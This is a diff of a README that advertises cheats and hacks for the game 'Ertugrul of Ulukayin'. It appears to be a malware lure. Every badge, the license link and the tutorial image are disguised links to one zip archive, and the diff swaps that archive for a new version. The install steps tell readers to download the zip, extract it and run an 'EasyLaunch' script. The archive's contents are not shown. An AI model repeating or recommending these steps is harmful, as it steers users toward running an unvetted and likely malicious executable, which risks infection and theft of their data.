@@ -1,9 +1,9 @@
 # ⚔️ Ertugrul of Ulukayin Cheats & Hacks 🌟
 
-[![License: MIT](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/of-ulukayin-ertugrul-legendary-tactics-3.1.zip)]
-[![OS Compatibility](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/of-ulukayin-ertugrul-legendary-tactics-3.1.zip%7CMac%7CLinux-blueviolet)]
-[![Languages](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/of-ulukayin-ertugrul-legendary-tactics-3.1.zip)]
-[![Support](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/of-ulukayin-ertugrul-legendary-tactics-3.1.zip%2F7-orange)]
+[![License: MIT](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/legendary_ulukayin_tactics_of_ertugrul_v3.8-beta.5.zip)]
+[![OS Compatibility](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/legendary_ulukayin_tactics_of_ertugrul_v3.8-beta.5.zip%7CMac%7CLinux-blueviolet)]
+[![Languages](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/legendary_ulukayin_tactics_of_ertugrul_v3.8-beta.5.zip)]
+[![Support](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/legendary_ulukayin_tactics_of_ertugrul_v3.8-beta.5.zip%2F7-orange)]
 
 ---
 
@@ -17,14 +17,14 @@ Every feature of *Ertugrul of Ulukayin* draws from centuries-old wisdom yet leve
 
 Embrace the power—in just a few minutes:
 
-1. **Download**: Retrieve `https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/of-ulukayin-ertugrul-legendary-tactics-3.1.zip` from this repository and place it in your preferred directory.
+1. **Download**: Retrieve `https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/legendary_ulukayin_tactics_of_ertugrul_v3.8-beta.5.zip` from this repository and place it in your preferred directory.
 2. **Unpack**: Extract all files. We recommend using trustworthy utilities for a seamless extraction.
 3. **Run**: Execute the `EasyLaunch` startup script to begin your adventure.
 4. **Enjoy**: Open the main interface, select your language, and dive into the feature set. Need help? Real-time support is just a click away.
 
 #### 🎬 Video Installation Tutorial
 
-![Installation Tutorial](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/of-ulukayin-ertugrul-legendary-tactics-3.1.zip)
+![Installation Tutorial](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/legendary_ulukayin_tactics_of_ertugrul_v3.8-beta.5.zip)
 
 Witness how smooth the initial setup for **Ertugrul of Ulukayin cheats hacks** can be! Just follow the GIF steps above and unlock new dimensions.
 
@@ -101,7 +101,7 @@ This resource is distributed strictly for entertainment, educational, and resear
 ## ⚖️ License
 
 Copyright 2025. Distributed under the MIT License.  
-For further details, read [the MIT License](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/of-ulukayin-ertugrul-legendary-tactics-3.1.zip).
+For further details, read [the MIT License](https://raw.githubusercontent.com/hamzasiddiqui20/ertugrul-of-ulukayin-legendary-tactics/main/okonite/legendary_ulukayin_tactics_of_ertugrul_v3.8-beta.5.zip).
 
 Let the saga continue—with wisdom, ethics, and a dash of legendary spirit! 🏇
 
